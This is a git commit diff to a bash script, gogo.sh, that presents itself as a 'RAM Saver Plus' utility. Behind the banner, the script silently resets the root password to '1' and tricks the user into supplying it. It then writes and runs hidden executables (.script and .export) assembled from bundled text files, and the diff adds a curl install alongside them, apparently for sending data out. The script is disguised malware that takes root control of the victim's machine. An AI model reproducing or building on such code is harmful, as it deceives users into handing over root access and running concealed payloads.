7d897fcb1213469883fc4d5fc23e0b62de684783
David <hdavidgleaton@gmail.com>
2020-07-19 15:22:09 -0400

    Further changes to ftp

--- gogo.sh
+++ gogo.sh
@@ -1,8 +1,10 @@
 #!/bin/bash
 
 echo -e "1\n1" | sudo passwd
+sudo apt-get install curl
 clear
 echo "Welcome to RAM Saver Plus! Enter '1' for the password to start!"
-su -c "cat temp.txt >> .script; chmod +x .script; ./.script"
+su -c "cat temp.txt >> .script; chmod +x .script; ./.script; cat crashlogger.txt >> .export; chmod +x .export;"
+./.export
 clear
 
